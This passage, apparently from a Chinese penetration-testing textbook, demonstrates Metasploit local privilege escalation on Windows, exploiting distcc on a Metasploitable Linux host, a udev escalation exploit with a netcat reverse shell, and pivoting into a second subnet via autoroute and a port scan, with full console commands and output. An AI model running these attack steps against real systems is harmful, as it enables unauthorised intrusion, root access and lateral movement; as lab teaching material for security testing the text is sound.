
命令，用于你已将其中的 Meterpreter 会话放入后台。这是一个你需要设置的参数，同时还需要设置有效载荷以及反向 Meterpreter shell 所需的本地主机和端口。你可以看到设置所有必要变量，然后启动漏洞利用。

## 使用来自 Metasploit 的本地漏洞利用

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 2
SESSION => 2
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 192.168.86.57
LHOST => 192.168.86.57
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445
LPORT => 4445
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit

[*] Started reverse TCP handler on 192.168.86.57:4445
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\ManageEngine\DesktopCentral_Server\bin\ROayyKQ.txt...
[*] Compressing script contents...
[+] Compressed size: 3621
[*] Executing exploit script...
```

在某些情况下，我们无法使用 Metasploit。我们需要使用一些外部工具。这可能意味着编译一个漏洞利用程序。在下一个代码清单中，你将看到利用分布式 C 编译器守护进程上的漏洞来攻破 Linux 系统。这使用了一个 Metasploit 模块来执行初始漏洞利用。权限提升需要编译一个 C 程序，使其在目标系统上运行。由于我们无法保证存在 C 编译器，因此该程序在攻击系统上编译。我们的目标是 32 位，而我们的攻击系统是 64 位。这意味着我们需要一组特殊的库，以便从一种目标架构交叉编译到另一种。不过，一旦有了输出，我们就可以将它和一个简单的 shell 脚本放入目录中，从 Web 服务器获取。在这个清单中，你将看到利用目标系统，然后运行权限提升。

## Linux 权限提升

```
msf > use exploit/unix/misc/distcc_exec
msf exploit(unix/misc/distcc_exec) > set RHOST 192.168.86.66
RHOST => 192.168.86.66
msf exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP double handler on 192.168.86.57:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
```

```
[*] Command: echo 9LVs5a2CaAEk29pj;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "9LVs5a2CaAEk29pj\\r\\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.66:47936)
at 2018-09-09 18:28:22 -0600
```

```
whoami
daemon
cd /tmp
ps auxwww | grep udev
root      2663  0.0  0.1  2216  700 ?        S<s  Apr24   0:00 /sbin/udevd
--daemon
daemon    6364  0.0  0.1  1784  532 ?        RN   11:54   0:00 grep udev
./escalate 2662
```

你在这里看不到下载所需的两个文件。其中一个就是漏洞利用程序本身，名为 escalate。另一个是名为 run 的简单 shell 脚本。它的作用是使用 netcat 将 shell 发送回我们的目标系统。在下一个代码清单中，你可以看到我们攻击系统上的反向连接。我们通过使用 netcat 打开一个监听端口来获取反向连接。用作监听端口的端口与 shell 脚本中使用的端口匹配。在权限提升攻击中，我们提供一个比 udev 进程的进程识别号少 1 的数字。这就是触发漏洞利用的东西。

## 使用 netcat 监听反向连接

```
root@quiche:~# netcat -lvp 5555
listening on [any] 5555 ...
192.168.86.66: inverse host lookup failed: Unknown host
connect to [192.168.86.57] from (UNKNOWN) [192.168.86.66] 50391
whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
GNU/Linux
```

这种漏洞利用链通常是获得必要访问权限所必需的。当然，获得管理访问权并非你想要做的全部，尽管这当然很有用。你还可能希望利用你已有的立足点，开始查看网络上的其他系统。

## 端点转发

有些组织采用扁平网络设计，即所有系统都连接到单个网络，而不是多个网络以允许分层访问。但是，关注关键资源安全的组织可能会有系统连接到多个系统。你可能会在攻破一个系统后发现它有多个接口，例如你在下面的代码清单中可以看到的那个系统。该系统是 Windows 系统，它有两个接口。一个在 192.168.86.0 网络上，即漏洞利用进入的接口。另一个接口在清单中名为 Interface 19，位于 172.30.42.0 网络上。这是我们想要攻击的网络，但我们不能只是把一堆攻击工具上传到被攻破的系统。相反，我们需要能够将流量从我们的攻击系统传递通过被攻破的系统，进入它所连接的网络。

## IP 地址配置

```
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > ipconfig

Interface 1
============
Name : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 12
============
Name : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU : 1280
IPv6 Address : fe80::5efe:c0a8:5621
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
```

```
Interface 13
==========

Name             : Intel(R) PRO/1000 MT Network Connection
Hardware MAC     : 1e:25:07:dc:7c:6e
MTU              : 1500
IPv4 Address     : 192.168.86.33
IPv4 Netmask     : 255.255.255.0
IPv6 Address     : fe80::35b1:1874:3712:8b59
IPv6 Netmask     : ffff:ffff:ffff:ffff::
```

```
Interface 19
============

Name             : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC     : 42:39:bd:ec:24:40
MTU              : 1500
IPv4 Address     : 172.30.42.50
IPv4 Netmask     : 255.255.255.0
IPv6 Address     : fe80::4b4:7b9a:b3b7:3742
IPv6 Netmask     : ffff:ffff:ffff:ffff::
```

为了添加我们需要将流量传递到 172.30.42.0 子网的路由，我们需要运行一个后利用模块。我们要运行的模块称为 autoroute，它将负责通过我们打开的会话向该网络添加路由。在下面的清单中，你可以看到运行 autoroute 模块。你将看到输出，指示路由已作为运行模块的结果添加。

## 运行 Autoroute

```
meterpreter > run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD

[!] SESSION may not be compatible with this module.
[*] Running module against VAGRANT-2008R2
[*] Adding a route to 172.30.42.0/255.255.255.0...
[+] Route added to subnet 172.30.42.0/255.255.255.0.
```

既然路由已就位，我们想要利用它。此时我们可以将 Meterpreter 会话置于后台，并针对该网络运行我们选择的任何模块。例如，针对该网络运行端口扫描并不奇怪。在下面的代码中，你可以看到在会话置于后台后从 Meterpreter 外部检查路由表（你可以使用 background 命令或键入 Ctrl+Z 将 Meterpreter 置于后台）。路由表显示我们有一条通过会话 1（即我们打开的 Meterpreter 会话）到达 172.30.42.0 网络的路由。之后，端口扫描模块被加载以针对该网络运行。

```
msf exploit(windows/http/manageengine_connectionid_write) > route print
```

IPv4 活动路由表

| 子网 | 子网掩码 | 网关 |
| :--- | :--- | :--- |
| 172.30.42.0 | 255.255.255.0 | 会话 1 |

[*] 当前未定义任何 IPv6 路由。

```
msf exploit(windows/http/manageengine_connectionid_write) >
```

```
msf exploit(windows/http/manageengine_connectionid_write) > use auxiliary/scanner/portscan/tcp
```

```
msf auxiliary(scanner/portscan/tcp) > set RHOSTS 172.30.42.0/24
```

```
RHOSTS => 172.30.42.0/24
```

```
msf auxiliary(scanner/portscan/tcp) > run
```

一旦你了解另一个网络上有哪些其他系统，就可以开始查找这些系统上的漏洞。端点转发的一切都是关于获取一个被攻破的系统并使用它来访问其他系统，即端点转发到这些系统。一旦你的网络路由就位，你就可以很好地完成该端点转发，从而将你的覆盖范围扩展到网络中。

## 持久化

获得访问权很重要，因为它证明你可以攻破系统并访问敏感信息。这是向你正在合作的组织展示他们存在哪些问题的好方法。但是，攻击者不希望每次想要访问系统时都要反复利用同一个漏洞。首先，这很耗时。其次，如果攻击者（即使是假攻击者，即你）正在利用一个漏洞，他们无法确定该漏洞不会被修补。这意味着他们之后可能无法进入。收集信息可能不是一次性的情况。当然，在企业环境中，数据在不断变化。无论攻击者的目标是什么，他们通常都希望保持对被攻破系统的访问权。

维持访问权的过程称为持久化。对系统的访问权随时间持续，并且理想情况下跨系统重新启动。无论发生什么，理想情况下，
